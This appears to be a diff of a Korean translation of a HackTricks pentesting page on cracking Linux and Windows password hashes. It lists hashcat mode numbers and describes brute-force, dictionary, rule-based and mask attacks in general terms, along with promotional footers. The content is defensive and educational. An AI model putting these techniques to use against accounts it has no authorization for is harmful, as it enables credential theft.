-Cracking Linux hashes from the `/etc/shadow` file is a common technique used in password cracking. By following the methodology outlined above, security professionals can identify and address weak passwords to enhance the security of Linux systems.
+리눅스 해시 크래킹 - /etc/shadow 파일
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-# 브루트 포스
+## Brute Forcing Windows Hashes
 
-브루트 포스는 모든 가능한 조합을 시도하여 암호를 찾는 공격 기술입니다. Windows 해시를 크래킹하는 데 사용될 수 있습니다. 이를 통해 사용자의 암호를 빠르게 찾을 수 있습니다.
+### Introduction
 
-## 브루트 포스 도구
+When it comes to cracking Windows hashes, one of the most common methods is brute forcing. Brute forcing involves trying all possible combinations of characters until the correct password is found. This can be a time-consuming process, but it is often effective.
 
-- **John the Ripper**: 다양한 해시 유형을 크래킹하는 데 사용되는 인기 있는 도구입니다.
-- **Hashcat**: CPU 및 GPU를 사용하여 빠르게 해시를 크래킹하는 데 사용됩니다.
+### Tools
 
-## 브루트 포스 공격
+There are several tools available for brute forcing Windows hashes, including **John the Ripper** and **Hashcat**. These tools are specifically designed for cracking passwords and can be highly effective when used correctly.
 
-1. **사전 공격**: 미리 정의된 단어 목록을 사용하여 암호를 찾습니다.
-2. **규칙 기반 공격**: 규칙을 적용하여 가능한 모든 조합을 시도합니다.
-3. **마스크 기반 공격**: 사용자가 정의한 패턴에 따라 암호를 생성합니다.
+### Methodology
 
-브루트 포스는 강력하지만 시간이 많이 소요될 수 있으며, 효율적인 암호를 사용하는 경우 크래킹이 어려울 수 있습니다.
+To brute force Windows hashes, you will typically need a wordlist containing potential passwords. You can also generate custom wordlists based on specific criteria such as password length, character sets, and patterns.
+
+### Considerations
+
+Before starting a brute force attack on Windows hashes, it is important to consider the potential legal implications. Unauthorized access to computer systems or networks is illegal and can result in severe consequences.
+
+### Conclusion
+
+Brute forcing Windows hashes can be a powerful technique for gaining unauthorized access to systems. However, it is essential to use this technique responsibly and ethically to avoid legal issues.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-# 빈도 높은 응용 프로그램 해시 크래킹
-
-해시 크래킹은 일반적으로 무차별 대입 공격을 사용하여 해시를 해독하는 프로세스입니다. 이 기술은 주로 패스워드와 같은 보호된 정보를 얻기 위해 사용됩니다. 일반적인 응용 프로그램 해시를 크래킹하는 데 사용되는 일반적인 방법은 다음과 같습니다.
-
-1. **사전 공격**: 미리 정의된 단어 목록(사전)을 사용하여 해시를 크래킹합니다.
-2. **룰 기반 공격**: 규칙을 사용하여 가능성 있는 패스워드를 생성하고 해시를 비교합니다.
-3. **하이브리드 공격**: 사전 공격과 룰 기반 공격을 결합하여 더 효율적으로 해시를 크래킹합니다.
-
-이러한 방법은 일반적으로 해시 함수의 취약점을 이용하여 해시를 해독하는 데 사용됩니다.
+일반적인 응용 프로그램 해시 크래킹
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -864,19 +812,19 @@ Cracking Linux hashes from the `/etc/shadow` file is a common technique used in 
 ```
 <details>
 
-<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team 전문가)</strong></a><strong>!</strong></summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요**.
-* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* [**PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출**하세요.
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
